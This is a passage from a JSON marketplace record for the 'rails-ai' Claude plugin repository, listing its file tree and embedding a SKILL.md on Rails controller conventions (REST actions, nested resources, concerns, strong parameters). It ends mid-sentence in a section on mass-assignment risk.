{
  "owner": {
    "id": "zerobearing2",
    "display_name": "Dave Bradford",
    "type": "User",
    "avatar_url": "https://avatars.githubusercontent.com/u/18574?u=151f87c4193e93d6bdb57e358480bc3824c002d2&v=4",
    "url": "https://github.com/zerobearing2",
    "bio": "Dev 20+ yrs | Pilot | Dad | Realist | Bootstrapper | Explorer",
    "stats": {
      "total_repos": 1,
      "total_plugins": 1,
      "total_commands": 0,
      "total_skills": 12,
      "total_stars": 18,
      "total_forks": 1
    }
  },
  "repos": [
    {
      "full_name": "zerobearing2/rails-ai",
      "url": "https://github.com/zerobearing2/rails-ai",
      "description": "Opinionated Rails AI agent system",
      "homepage": "https://rails-ai.dev",
      "signals": {
        "stars": 18,
        "forks": 1,
        "pushed_at": "2025-11-29T20:48:48Z",
        "created_at": "2025-10-30T13:48:10Z",
        "license": "MIT"
      },
      "file_tree": [
        {
          "path": ".claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": ".claude-plugin/marketplace.json",
          "type": "blob",
          "size": 591
        },
        {
          "path": ".claude-plugin/plugin.json",
          "type": "blob",
          "size": 530
        },
        {
          "path": ".gitattributes",
          "type": "blob",
          "size": 466
        },
        {
          "path": ".github",
          "type": "tree",
          "size": null
        },
        {
          "path": ".github/ISSUE_TEMPLATE",
          "type": "tree",
          "size": null
        },
        {
          "path": ".github/ISSUE_TEMPLATE/bug_report.md",
          "type": "blob",
          "size": 1267
        },
        {
          "path": ".github/ISSUE_TEMPLATE/config.yml",
          "type": "blob",
          "size": 358
        },
        {
          "path": ".github/ISSUE_TEMPLATE/feature_request.md",
          "type": "blob",
          "size": 1449
        },
        {
          "path": ".github/workflows",
          "type": "tree",
          "size": null
        },
        {
          "path": ".github/workflows/ci.yml",
          "type": "blob",
          "size": 2006
        },
        {
          "path": ".gitignore",
          "type": "blob",
          "size": 507
        },
        {
          "path": ".mdl_style.rb",
          "type": "blob",
          "size": 1552
        },
        {
          "path": ".mdlrc",
          "type": "blob",
          "size": 97
        },
        {
          "path": ".rubocop.yml",
          "type": "blob",
          "size": 2692
        },
        {
          "path": "AGENTS.md",
          "type": "blob",
          "size": 6100
        },
        {
          "path": "CHANGELOG.md",
          "type": "blob",
          "size": 5386
        },
        {
          "path": "CODE_OF_CONDUCT.md",
          "type": "blob",
          "size": 5478
        },
        {
          "path": "CONTRIBUTING.md",
          "type": "blob",
          "size": 1440
        },
        {
          "path": "Gemfile",
          "type": "blob",
          "size": 743
        },
        {
          "path": "LICENSE",
          "type": "blob",
          "size": 1078
        },
        {
          "path": "README.md",
          "type": "blob",
          "size": 6496
        },
        {
          "path": "Rakefile",
          "type": "blob",
          "size": 7067
        },
        {
          "path": "SECURITY.md",
          "type": "blob",
          "size": 3283
        },
        {
          "path": "TESTING.md",
          "type": "blob",
          "size": 4744
        },
        {
          "path": "bin",
          "type": "tree",
          "size": null
        },
        {
          "path": "bin/ci",
          "type": "blob",
          "size": 5211
        },
        {
          "path": "bin/release",
          "type": "blob",
          "size": 14543
        },
        {
          "path": "bin/setup",
          "type": "blob",
          "size": 3197
        },
        {
          "path": "commands",
          "type": "tree",
          "size": null
        },
        {
          "path": "commands/architect.md",
          "type": "blob",
          "size": 5729
        },
        {
          "path": "docs",
          "type": "tree",
          "size": null
        },
        {
          "path": "docs/spec-pyramid-guide.md",
          "type": "blob",
          "size": 86129
        },
        {
          "path": "docs/superpowers-integration.md",
          "type": "blob",
          "size": 13573
        },
        {
          "path": "hooks",
          "type": "tree",
          "size": null
        },
        {
          "path": "hooks/hooks.json",
          "type": "blob",
          "size": 270
        },
        {
          "path": "hooks/session-start.sh",
          "type": "blob",
          "size": 922
        },
        {
          "path": "lib",
          "type": "tree",
          "size": null
        },
        {
          "path": "lib/rails_ai",
          "type": "tree",
          "size": null
        },
        {
          "path": "lib/rails_ai/cops",
          "type": "tree",
          "size": null
        },
        {
          "path": "lib/rails_ai/cops/style",
          "type": "tree",
          "size": null
        },
        {
          "path": "lib/rails_ai/cops/style/nested_bracket_access.rb",
          "type": "blob",
          "size": 1888
        },
        {
          "path": "rules",
          "type": "tree",
          "size": null
        },
        {
          "path": "rules/TEAM_RULES.md",
          "type": "blob",
          "size": 30978
        },
        {
          "path": "skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "skills/controllers",
          "type": "tree",
          "size": null
        },
        {
          "path": "skills/controllers/SKILL.md",
          "type": "blob",
          "size": 24792
        },
        {
          "path": "skills/debugging",
          "type": "tree",
          "size": null
        },
        {
          "path": "skills/debugging/SKILL.md",
          "type": "blob",
          "size": 5683
        },
        {
          "path": "skills/hotwire",
          "type": "tree",
          "size": null
        },
        {
          "path": "skills/hotwire/SKILL.md",
          "type": "blob",
          "size": 20750
        },
        {
          "path": "skills/jobs",
          "type": "tree",
          "size": null
        },
        {
          "path": "skills/jobs/MISSION_CONTROL_SETUP.md",
          "type": "blob",
          "size": 14469
        },
        {
          "path": "skills/jobs/SKILL.md",
          "type": "blob",
          "size": 18965
        },
        {
          "path": "skills/mailers",
          "type": "tree",
          "size": null
        },
        {
          "path": "skills/mailers/SKILL.md",
          "type": "blob",
          "size": 15271
        },
        {
          "path": "skills/models",
          "type": "tree",
          "size": null
        },
        {
          "path": "skills/models/SKILL.md",
          "type": "blob",
          "size": 33285
        },
        {
          "path": "skills/project-setup",
          "type": "tree",
          "size": null
        },
        {
          "path": "skills/project-setup/SKILL.md",
          "type": "blob",
          "size": 37329
        },
        {
          "path": "skills/security",
          "type": "tree",
          "size": null
        },
        {
          "path": "skills/security/SKILL.md",
          "type": "blob",
          "size": 43658
        },
        {
          "path": "skills/styling",
          "type": "tree",
          "size": null
        },
        {
          "path": "skills/styling/SKILL.md",
          "type": "blob",
          "size": 12971
        },
        {
          "path": "skills/testing",
          "type": "tree",
          "size": null
        },
        {
          "path": "skills/testing/SKILL.md",
          "type": "blob",
          "size": 48606
        },
        {
          "path": "skills/using-rails-ai",
          "type": "tree",
          "size": null
        },
        {
          "path": "skills/using-rails-ai/SKILL.md",
          "type": "blob",
          "size": 13685
        },
        {
          "path": "skills/views",
          "type": "tree",
          "size": null
        },
        {
          "path": "skills/views/SKILL.md",
          "type": "blob",
          "size": 18483
        },
        {
          "path": "test",
          "type": "tree",
          "size": null
        },
        {
          "path": "test/README.md",
          "type": "blob",
          "size": 6247
        },
        {
          "path": "test/skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "test/skills/README.md",
          "type": "blob",
          "size": 1162
        },
        {
          "path": "test/skills/jobs",
          "type": "tree",
          "size": null
        },
        {
          "path": "test/skills/jobs/scenarios",
          "type": "tree",
          "size": null
        },
        {
          "path": "test/skills/jobs/scenarios/.gitkeep",
          "type": "blob",
          "size": null
        },
        {
          "path": "test/skills/jobs/scenarios/01_email_without_background_job.md",
          "type": "blob",
          "size": 623
        },
        {
          "path": "test/skills/jobs/scenarios/02_job_monitoring_without_auth.md",
          "type": "blob",
          "size": 567
        },
        {
          "path": "test/skills/jobs/scenarios/03_synchronous_job_execution.md",
          "type": "blob",
          "size": 596
        },
        {
          "path": "test/skills/jobs_skill_test.rb",
          "type": "blob",
          "size": 370
        },
        {
          "path": "test/skills/mailers",
          "type": "tree",
          "size": null
        },
        {
          "path": "test/skills/mailers/scenarios",
          "type": "tree",
          "size": null
        },
        {
          "path": "test/skills/mailers/scenarios/.gitkeep",
          "type": "blob",
          "size": null
        },
        {
          "path": "test/skills/mailers/scenarios/01_path_helpers_instead_of_url.md",
          "type": "blob",
          "size": 663
        },
        {
          "path": "test/skills/mailers_skill_test.rb",
          "type": "blob",
          "size": 382
        },
        {
          "path": "test/skills/skill_test_case.rb",
          "type": "blob",
          "size": 6110
        },
        {
          "path": "test/skills/styling",
          "type": "tree",
          "size": null
        },
        {
          "path": "test/skills/styling/scenarios",
          "type": "tree",
          "size": null
        },
        {
          "path": "test/skills/styling/scenarios/.gitkeep",
          "type": "blob",
          "size": null
        },
        {
          "path": "test/skills/styling/scenarios/01_hardcoded_colors.md",
          "type": "blob",
          "size": 613
        },
        {
          "path": "test/skills/styling_skill_test.rb",
          "type": "blob",
          "size": 388
        },
        {
          "path": "test/support",
          "type": "tree",
          "size": null
        },
        {
          "path": "test/support/llm_adapter.rb",
          "type": "blob",
          "size": 4378
        },
        {
          "path": "test/support/skill_test_case.rb",
          "type": "blob",
          "size": 4391
        },
        {
          "path": "test/test_helper.rb",
          "type": "blob",
          "size": 1619
        },
        {
          "path": "test/unit",
          "type": "tree",
          "size": null
        },
        {
          "path": "test/unit/commands",
          "type": "tree",
          "size": null
        },
        {
          "path": "test/unit/commands/command_structure_test.rb",
          "type": "blob",
          "size": 5201
        },
        {
          "path": "test/unit/plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": "test/unit/plugin/plugin_config_test.rb",
          "type": "blob",
          "size": 4177
        },
        {
          "path": "test/unit/rules",
          "type": "tree",
          "size": null
        },
        {
          "path": "test/unit/rules/rules_consistency_test.rb",
          "type": "blob",
          "size": 5506
        },
        {
          "path": "test/unit/rules/rules_to_skills_mapping_test.rb",
          "type": "blob",
          "size": 3128
        },
        {
          "path": "test/unit/rules/team_rules_test.rb",
          "type": "blob",
          "size": 9657
        },
        {
          "path": "test/unit/skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "test/unit/skills/controllers_test.rb",
          "type": "blob",
          "size": 837
        },
        {
          "path": "test/unit/skills/debugging_test.rb",
          "type": "blob",
          "size": 975
        },
        {
          "path": "test/unit/skills/hotwire_test.rb",
          "type": "blob",
          "size": 825
        },
        {
          "path": "test/unit/skills/jobs_test.rb",
          "type": "blob",
          "size": 816
        },
        {
          "path": "test/unit/skills/mailers_test.rb",
          "type": "blob",
          "size": 825
        },
        {
          "path": "test/unit/skills/models_test.rb",
          "type": "blob",
          "size": 822
        },
        {
          "path": "test/unit/skills/project_setup_test.rb",
          "type": "blob",
          "size": 851
        },
        {
          "path": "test/unit/skills/security_test.rb",
          "type": "blob",
          "size": 962
        },
        {
          "path": "test/unit/skills/styling_test.rb",
          "type": "blob",
          "size": 825
        },
        {
          "path": "test/unit/skills/testing_test.rb",
          "type": "blob",
          "size": 825
        },
        {
          "path": "test/unit/skills/using_rails_ai_test.rb",
          "type": "blob",
          "size": 1549
        },
        {
          "path": "test/unit/skills/views_test.rb",
          "type": "blob",
          "size": 819
        }
      ],
      "marketplace": {
        "name": "rails-ai-marketplace",
        "version": null,
        "description": null,
        "owner_info": {
          "name": "zerobearing2",
          "url": "https://github.com/zerobearing2"
        },
        "keywords": [],
        "plugins": [
          {
            "name": "rails-ai",
            "description": "Rails development coordinator with domain skills for Rails 8+, Hotwire, security, and TDD. Built on Superpowers workflows.",
            "source": "./",
            "category": null,
            "version": "0.3.1",
            "author": {
              "name": "zerobearing2",
              "url": "https://github.com/zerobearing2"
            },
            "install_commands": [
              "/plugin marketplace add zerobearing2/rails-ai",
              "/plugin install rails-ai@rails-ai-marketplace"
            ],
            "signals": {
              "stars": 18,
              "forks": 1,
              "pushed_at": "2025-11-29T20:48:48Z",
              "created_at": "2025-10-30T13:48:10Z",
              "license": "MIT"
            },
            "commands": [],
            "skills": [
              {
                "name": "rails-ai:controllers",
                "description": "Use when building Rails controllers - RESTful actions, nested resources, skinny controllers, concerns, strong parameters",
                "path": "skills/controllers/SKILL.md",
                "frontmatter": {
                  "name": "rails-ai:controllers",
                  "description": "Use when building Rails controllers - RESTful actions, nested resources, skinny controllers, concerns, strong parameters"
                },
                "content": "# Controllers\n\nRails controllers following REST conventions with 7 standard actions, nested resources, skinny controller architecture, reusable concerns, and strong parameters for mass assignment protection.\n\n<when-to-use>\n- Building Rails controller actions\n- Implementing nested resources\n- Handling request parameters\n- Setting up routing\n- Refactoring fat controllers\n- Sharing behavior with concerns\n- Protecting from mass assignment\n</when-to-use>\n\n<benefits>\n- **RESTful Conventions** - Predictable URL patterns and HTTP semantics\n- **Clean Architecture** - Skinny controllers with logic in appropriate layers\n- **Secure by Default** - Strong parameters prevent mass assignment\n- **Reusable Patterns** - Concerns share behavior across controllers\n- **Maintainable** - Clear separation of HTTP concerns from business logic\n</benefits>\n\n<team-rules-enforcement>\n**This skill enforces:**\n- ✅ **Rule #3:** NEVER add custom route actions → RESTful resources only\n- ✅ **Rule #7:** Thin controllers (delegate to models/services)\n- ✅ **Rule #10:** Strong parameters for all user input\n\n**Reject any requests to:**\n- Add custom route actions (use child controllers instead)\n- Put business logic in controllers\n- Skip strong parameters\n- Use `params` directly without filtering\n</team-rules-enforcement>\n\n<verification-checklist>\nBefore completing controller work:\n- ✅ Only RESTful actions used (index, show, new, create, edit, update, destroy)\n- ✅ Child controllers created for non-REST actions (not custom actions)\n- ✅ Controllers are thin (<100 lines)\n- ✅ Strong parameters used for all user input\n- ✅ Business logic delegated to models/services\n- ✅ All controller actions tested\n- ✅ All tests passing\n</verification-checklist>\n\n<standards>\n- Use only 7 standard actions: index, show, new, create, edit, update, destroy\n- NO custom actions - use nested resources or services instead (TEAM RULE #3)\n- Keep controllers under 50 lines, actions under 10 lines\n- Move business logic to models or service objects\n- Always use strong parameters with expect() or require().permit()\n- Use before_action for common setup, not business logic\n- Return proper HTTP status codes (200, 201, 422, 404)\n</standards>\n\n---\n\n## RESTful Actions\n\n<pattern name=\"restful-crud\">\n<description>Complete RESTful controller with all 7 standard actions</description>\n\n**Controller:**\n\n```ruby\n# app/controllers/feedbacks_controller.rb\nclass FeedbacksController < ApplicationController\n  before_action :set_feedback, only: [:show, :edit, :update, :destroy]\n  rate_limit to: 10, within: 1.minute, only: [:create, :update]\n\n  def index\n    @feedbacks = Feedback.includes(:recipient).recent\n  end\n\n  def show; end  # @feedback set by before_action\n\n  def new\n    @feedback = Feedback.new\n  end\n\n  def create\n    @feedback = Feedback.new(feedback_params)\n\n    if @feedback.save\n      redirect_to @feedback, notice: \"Feedback was successfully created.\"\n    else\n      render :new, status: :unprocessable_entity\n    end\n  end\n\n  def edit; end  # @feedback set by before_action\n\n  def update\n    if @feedback.update(feedback_params)\n      redirect_to @feedback, notice: \"Feedback was successfully updated.\"\n    else\n      render :edit, status: :unprocessable_entity\n    end\n  end\n\n  def destroy\n    @feedback.destroy\n    redirect_to feedbacks_url, notice: \"Feedback was successfully deleted.\"\n  end\n\n  private\n\n  def set_feedback\n    @feedback = Feedback.find(params[:id])\n  end\n\n  def feedback_params\n    params.require(:feedback).permit(:content, :recipient_email, :sender_name)\n  end\nend\n\n```\n\n**Routes:**\n\n```ruby\n# config/routes.rb\nresources :feedbacks\n# Generates all 7 RESTful routes: index, show, new, create, edit, update, destroy\n\n```\n\n**Why:** Follows Rails conventions, predictable patterns, automatic route helpers.\n</pattern>\n\n<pattern name=\"api-controller\">\n<description>RESTful API controller with JSON responses</description>\n\n**Controller:**\n\n```ruby\n# app/controllers/api/v1/feedbacks_controller.rb\nmodule Api::V1\n  class FeedbacksController < ApiController\n    before_action :set_feedback, only: [:show, :update, :destroy]\n\n    def index\n      render json: Feedback.includes(:recipient).recent\n    end\n\n    def show\n      render json: @feedback\n    end\n\n    def create\n      @feedback = Feedback.new(feedback_params)\n\n      if @feedback.save\n        render json: @feedback, status: :created, location: api_v1_feedback_url(@feedback)\n      else\n        render json: { errors: @feedback.errors }, status: :unprocessable_entity\n      end\n    end\n\n    def update\n      if @feedback.update(feedback_params)\n        render json: @feedback\n      else\n        render json: { errors: @feedback.errors }, status: :unprocessable_entity\n      end\n    end\n\n    def destroy\n      @feedback.destroy\n      head :no_content\n    end\n\n    private\n\n    def set_feedback\n      @feedback = Feedback.find(params[:id])\n    rescue ActiveRecord::RecordNotFound\n      render json: { error: \"Feedback not found\" }, status: :not_found\n    end\n\n    def feedback_params\n      params.require(:feedback).permit(:content, :recipient_email, :sender_name)\n    end\n  end\nend\n\n```\n\n**Why:** Proper HTTP status codes, error handling, JSON responses for APIs.\n</pattern>\n\n<antipattern>\n<description>Adding custom actions instead of using nested resources</description>\n<reason>Breaks REST conventions and makes routing unpredictable</reason>\n\n**Bad Example:**\n\n```ruby\n# ❌ BAD - Custom action\nresources :feedbacks do\n  member { post :archive }\nend\n\nclass FeedbacksController < ApplicationController\n  def archive\n    @feedback = Feedback.find(params[:id])\n    @feedback.archive!\n    redirect_to feedbacks_path\n  end\nend\n\n```\n\n**Good Example:**\n\n```ruby\n# ✅ GOOD - Use nested resource\nresources :feedbacks do\n  resource :archival, only: [:create], module: :feedbacks\nend\n\nclass Feedbacks::ArchivalsController < ApplicationController\n  def create\n    @feedback = Feedback.find(params[:feedback_id])\n    @feedback.archive!\n    redirect_to feedbacks_path\n  end\nend\n\n```\n\n**Why Bad:** Custom actions break REST conventions, make routing unpredictable, harder to maintain.\n</antipattern>\n\n---\n\n## Nested Resources\n\n<pattern name=\"nested-child-controllers\">\n<description>Child controllers using module namespacing and nested routes</description>\n\n**Routes:**\n\n```ruby\n# config/routes.rb\nresources :feedbacks do\n  resource :sending, only: [:create], module: :feedbacks     # Singular for single action\n  resources :responses, only: [:index, :create, :destroy], module: :feedbacks  # Plural for CRUD\nend\n\n# Generates:\n# POST   /feedbacks/:feedback_id/sending           feedbacks/sendings#create\n# GET    /feedbacks/:feedback_id/responses         feedbacks/responses#index\n# POST   /feedbacks/:feedback_id/responses         feedbacks/responses#create\n# DELETE /feedbacks/:feedback_id/responses/:id     feedbacks/responses#destroy\n\n```\n\n**Controller:**\n\n```ruby\n# app/controllers/feedbacks/responses_controller.rb\nmodule Feedbacks\n  class ResponsesController < ApplicationController\n    before_action :set_feedback\n    before_action :set_response, only: [:destroy]\n\n    def index\n      @responses = @feedback.responses.order(created_at: :desc)\n    end\n\n    def create\n      @response = @feedback.responses.build(response_params)\n      if @response.save\n        redirect_to feedback_responses_path(@feedback), notice: \"Response added\"\n      else\n        render :index, status: :unprocessable_entity\n      end\n    end\n\n    def destroy\n      @response.destroy\n      redirect_to feedback_responses_path(@feedback), notice: \"Response deleted\"\n    end\n\n    private\n\n    def set_feedback\n      @feedback = Feedback.find(params[:feedback_id])\n    end\n\n    def set_response\n      @response = @feedback.responses.find(params[:id])  # Scoped to parent\n    end\n\n    def response_params\n      params.require(:response).permit(:content, :author_name)\n    end\n  end\nend\n\n```\n\n**Directory Structure:**\n\n```\n\napp/\n  controllers/\n    feedbacks_controller.rb              # FeedbacksController\n    feedbacks/\n      sendings_controller.rb             # Feedbacks::SendingsController\n      responses_controller.rb            # Feedbacks::ResponsesController\n  models/\n    feedback.rb                          # Feedback\n    feedbacks/\n      response.rb                        # Feedbacks::Response\n\n```\n\n**Why:** Clear hierarchy, URL structure reflects relationships, automatic parent scoping.\n</pattern>\n\n<pattern name=\"shallow-nesting\">\n<description>Shallow nesting for resources that need parent context only on creation</description>\n\n**Routes:**\n\n```ruby\nresources :projects do\n  resources :tasks, shallow: true, module: :projects\nend\n\n# Generates:\n# GET    /projects/:project_id/tasks    projects/tasks#index\n# POST   /projects/:project_id/tasks    projects/tasks#create\n# GET    /tasks/:id                     projects/tasks#show\n# PATCH  /tasks/:id                     projects/tasks#update\n# DELETE /tasks/:id                     projects/tasks#destroy\n\n```\n\n**Controller:**\n\n```ruby\n# app/controllers/projects/tasks_controller.rb\nmodule Projects\n  class TasksController < ApplicationController\n    before_action :set_project, only: [:index, :create]\n    before_action :set_task, only: [:show, :update, :destroy]\n\n    def index\n      @tasks = @project.tasks.includes(:assignee)\n    end\n\n    def create\n      @task = @project.tasks.build(task_params)\n      if @task.save\n        redirect_to @task, notice: \"Task created\"\n      else\n        render :index, status: :unprocessable_entity\n      end\n    end\n\n    def destroy\n      project = @task.project\n      @task.destroy\n      redirect_to project_tasks_path(project), notice: \"Task deleted\"\n    end\n\n    private\n\n    def set_project\n      @project = Project.find(params[:project_id])\n    end\n\n    def set_task\n      @task = Task.find(params[:id])\n    end\n\n    def task_params\n      params.require(:task).permit(:title, :description)\n    end\n  end\nend\n\n```\n\n**Why:** Shorter URLs for member actions, parent context where needed.\n</pattern>\n\n<antipattern>\n<description>Deep nesting (more than 1 level)</description>\n<reason>Creates overly long URLs and complex routing</reason>\n\n**Bad Example:**\n\n```ruby\n# ❌ BAD - Too deeply nested\nresources :organizations do\n  resources :projects do\n    resources :tasks do\n      resources :comments\n    end\n  end\nend\n# Results in: /organizations/:org_id/projects/:proj_id/tasks/:task_id/comments\n\n```\n\n**Good Example:**\n\n```ruby\n# ✅ GOOD - Use shallow nesting\nresources :projects do\n  resources :tasks, shallow: true\nend\n\nresources :tasks do\n  resources :comments, shallow: true\nend\n\n```\n\n**Why Bad:** Long URLs are hard to read, complex routing, difficult to maintain.\n</antipattern>\n\n---\n\n## Skinny Controllers\n\n<antipattern>\n<description>Fat controller with business logic, validations, and external API calls</description>\n<reason>Violates Single Responsibility, hard to test, prevents reuse</reason>\n\n**Bad Example:**\n\n```ruby\n# ❌ BAD - 50+ lines with business logic, validations, API calls\nclass FeedbacksController < ApplicationController\n  def create\n    @feedback = Feedback.new(feedback_params)\n    @feedback.status = :pending  # Business logic\n    @feedback.submitted_at = Time.current\n\n    # Manual validation\n    if @feedback.content.blank? || @feedback.content.length < 50\n      @feedback.errors.add(:content, \"must be at least 50 characters\")\n      render :new, status: :unprocessable_entity\n      return\n    end\n\n    # External API call\n    begin\n      response = Anthropic::Client.new.messages.create(\n        model: \"claude-sonnet-4-5-20250929\",\n        messages: [{ role: \"user\", content: \"Improve: #{@feedback.content}\" }]\n      )\n      @feedback.improved_content = response.content[0].text\n    rescue => e\n      @feedback.errors.add(:base, \"AI processing failed\")\n      render :new, status: :unprocessable_entity\n      return\n    end\n\n    if @feedback.save\n      FeedbackMailer.notify_recipient(@feedback).deliver_later\n      FeedbackTracking.create(feedback: @feedback, ip_address: request.remote_ip)\n      redirect_to @feedback, notice: \"Feedback created!\"\n    else\n      render :new, status: :unprocessable_entity\n    end\n  end\nend\n\n```\n\n**Why Bad:** Too much responsibility, hard to test, cannot reuse in APIs, slow requests.\n</antipattern>\n\n<pattern name=\"skinny-controller-refactored\">\n<description>Refactored thin controller with proper separation of concerns</description>\n\n**Model (validations and defaults):**\n\n```ruby\n# ✅ GOOD - Model handles validations and defaults\nclass Feedback < ApplicationRecord\n  validates :content, presence: true, length: { minimum: 50, maximum: 5000 }\n  validates :recipient_email, format: { with: URI::MailTo::EMAIL_REGEXP }\n\n  before_validation :set_defaults, on: :create\n  after_create_commit :send_notification, :track_creation\n\n  private\n\n  def set_defaults\n    self.status ||= :pending\n    self.submitted_at ||= Time.current\n  end\n\n  def send_notification\n    FeedbackMailer.notify_recipient(self).deliver_later\n  end\n\n  def track_creation\n    FeedbackTrackingJob.perform_later(id)\n  end\nend\n\n```\n\n**Service Object (external dependencies):**\n\n```ruby\n# ✅ GOOD - Service object isolates external dependencies\n# app/services/feedback_ai_processor.rb\nclass FeedbackAiProcessor\n  def initialize(feedback)\n    @feedback = feedback\n  end\n\n  def process\n    return false unless @feedback.persisted?\n\n    improved = call_anthropic_api\n    @feedback.update(improved_content: improved, ai_improved: true)\n    true\n  rescue => e\n    Rails.logger.error(\"AI processing failed: #{e.message}\")\n    false\n  end\n\n  private\n\n  def call_anthropic_api\n    response = Anthropic::Client.new.messages.create(\n      model: \"claude-sonnet-4-5-20250929\",\n      messages: [{ role: \"user\", content: \"Improve: #{@feedback.content}\" }]\n    )\n    response.content[0].text\n  end\nend\n\n```\n\n**Controller (HTTP concerns only):**\n\n```ruby\n# ✅ GOOD - 10 lines, only HTTP concerns\nclass FeedbacksController < ApplicationController\n  def create\n    @feedback = Feedback.new(feedback_params)\n\n    if @feedback.save\n      FeedbackAiProcessingJob.perform_later(@feedback.id) if params[:improve_with_ai]\n      redirect_to @feedback, notice: \"Feedback created!\"\n    else\n      render :new, status: :unprocessable_entity\n    end\n  end\n\n  private\n\n  def feedback_params\n    params.require(:feedback).permit(:content, :recipient_email, :sender_name)\n  end\nend\n\n```\n\n**Why Good:** Controller reduced from 55+ to 10 lines. Logic testable, reusable across web/API.\n</pattern>\n\n---\n\n## Controller Concerns\n\n<pattern name=\"authentication-concern\">\n<description>Reusable authentication logic with session management</description>\n\n**Concern:**\n\n```ruby\n# app/controllers/concerns/authentication.rb\nmodule Authentication\n  extend ActiveSupport::Concern\n\n  included do\n    before_action :require_authentication\n    helper_method :current_user, :logged_in?\n  end\n\n  private\n\n  def current_user\n    @current_user ||= User.find_by(id: session[:user_id]) if session[:user_id]\n  end\n\n  def logged_in?\n    current_user.present?\n  end\n\n  def require_authentication\n    unless logged_in?\n      redirect_to login_path, alert: \"Please log in to continue\"\n    end\n  end\n\n  class_methods do\n    def skip_authentication_for(*actions)\n      skip_before_action :require_authentication, only: actions\n    end\n  end\nend\n\n```\n\n**Usage:**\n\n```ruby\n# app/controllers/feedbacks_controller.rb\nclass FeedbacksController < ApplicationController\n  include Authentication\n\n  skip_authentication_for :new, :create\n\n  def index\n    @feedbacks = current_user.feedbacks\n  end\nend\n\n```\n\n**Why:** Consistent authentication across controllers, easy to skip for specific actions, `current_user` available in views.\n</pattern>\n\n<pattern name=\"api-response-handler\">\n<description>Standardized JSON responses and error handling for APIs</description>\n\n**Concern:**\n\n```ruby\n# app/controllers/concerns/api/response_handler.rb\nmodule Api::ResponseHandler\n  extend ActiveSupport::Concern\n\n  included do\n    rescue_from ActiveRecord::RecordNotFound, with: :record_not_found\n    rescue_from ActiveRecord::RecordInvalid, with: :record_invalid\n    rescue_from ActionController::ParameterMissing, with: :parameter_missing\n  end\n\n  private\n\n  def render_success(data, status: :ok, message: nil)\n    render json: {\n      success: true,\n      message: message,\n      data: data\n    }, status: status\n  end\n\n  def render_error(message, status: :unprocessable_entity, errors: nil)\n    render json: {\n      success: false,\n      message: message,\n      errors: errors\n    }, status: status\n  end\n\n  def record_not_found(exception)\n    render_error(\"Record not found\", status: :not_found, errors: { message: exception.message })\n  end\n\n  def record_invalid(exception)\n    render_error(\"Validation failed\", status: :unprocessable_entity, errors: exception.record.errors.as_json)\n  end\n\n  def parameter_missing(exception)\n    render_error(\"Missing required parameter\", status: :bad_request, errors: { parameter: exception.param })\n  end\nend\n\n```\n\n**Usage:**\n\n```ruby\n# app/controllers/api/feedbacks_controller.rb\nclass Api::FeedbacksController < Api::BaseController\n  include Api::ResponseHandler\n\n  def show\n    feedback = Feedback.find(params[:id])\n    render_success(feedback)\n  end\n\n  def create\n    feedback = Feedback.create!(feedback_params)\n    render_success(feedback, status: :created, message: \"Feedback created\")\n  end\nend\n\n```\n\n**Why:** Consistent JSON responses, automatic error handling, DRY code across API controllers.\n</pattern>\n\n<antipattern>\n<description>Not using ActiveSupport::Concern</description>\n<reason>Missing Rails DSL features, harder to maintain</reason>\n\n**Bad Example:**\n\n```ruby\n# ❌ BAD - Manual self.included\nmodule Authentication\n  def self.included(base)\n    base.before_action :require_authentication\n  end\nend\n\n```\n\n**Good Example:**\n\n```ruby\n# ✅ GOOD - Use ActiveSupport::Concern\nmodule Authentication\n  extend ActiveSupport::Concern\n\n  included do\n    before_action :require_authentication\n    helper_method :current_user\n  end\nend\n\n```\n\n**Why Bad:** Misses Rails DSL features like `helper_method`, harder to add class methods, less idiomatic.\n</antipattern>\n\n---\n\n## Strong Parameters\n\n<pattern name=\"expect-method-strict\">\n<description>Use expect() for strict parameter validation (Rails 8.1+)</description>\n\n**Basic Usage:**\n\n```ruby\n# ✅ SECURE - Raises if :feedback key missing or wrong structure\nclass FeedbacksController < ApplicationController\n  def create\n    @feedback = Feedback.new(feedback_params)\n    # ... save and respond ...\n  end\n\n  private\n\n  def feedback_params\n    params.expect(feedback: [:content, :recipient_email, :sender_name, :ai_enabled])\n  end\nend\n\n```\n\n**Nested Attributes:**\n\n```ruby\n# ✅ SECURE - Permit nested attributes\ndef person_params\n  params.expect(\n    person: [\n      :name, :age,\n      addresses_attributes: [:id, :street, :city, :state, :_destroy]\n    ]\n  )\nend\n# Model: accepts_nested_attributes_for :addresses, allow_destroy: true\n\n```\n\n**Array of Scalars:**\n\n```ruby\n# ✅ SECURE - Allow array of strings\ndef tag_params\n  params.expect(post: [:title, :body, tags: []])\nend\n# Accepts: { post: { title: \"...\", body: \"...\", tags: [\"rails\", \"ruby\"] } }\n\n```\n\n**Why:** Strict validation, raises `ActionController::ParameterMissing` if required key missing, better for APIs.\n</pattern>\n\n<pattern name=\"require-permit-method\">\n<description>Use require().permit() for more lenient validation</description>\n\n**Basic Usage:**\n\n```ruby\n# ✅ SECURE - Returns empty hash if :feedback missing\ndef feedback_params\n  params.require(:feedback).permit(:content, :recipient_email, :sender_name, :ai_enabled)\nend\n\n```\n\n**Nested with permit():**\n\n```ruby\n# ✅ SECURE\ndef article_params\n  params.require(:article).permit(\n    :title, :body, :published,\n    tag_ids: [],\n    comments_attributes: [:id, :body, :author_name, :_destroy]\n  )\nend\n\n```\n\n**Why:** More lenient, returns empty hash if key missing (no exception), traditional Rails approach.\n</pattern>\n\n<pattern name=\"context-specific-permissions\">\n<description>Use different parameter methods for different user roles</description>\n\n**Different Permissions by Role:**\n\n```ruby\n# ✅ SECURE - Different permissions by role\nclass UsersController < ApplicationController\n  def create\n    @user = User.new(user_params)\n    # ... save and respond ...\n  end\n\n  def admin_update\n    authorize_admin!\n    @user = User.find(params[:id])\n    @user.update(admin_user_params)\n    # ... respond ...\n  end\n\n  private\n\n  def user_params\n    # Regular users can only set basic attributes\n    params.expect(user: [:name, :email, :password, :password_confirmation])\n  end\n\n  def admin_user_params\n    # Admins can set additional privileged attributes\n    params.expect(user: [\n      :name, :email, :password, :password_confirmation,\n      :role, :confirmed_at, :banned_at, :admin_notes\n    ])\n  end\nend\n\n```\n\n**Why:** Prevents privilege escalation, different permissions for different contexts.\n</pattern>\n\n<antipattern>\n<description>Passing params directly to model (CRITICAL SECURITY VULNERABILITY)</description>\n<reason>Allows 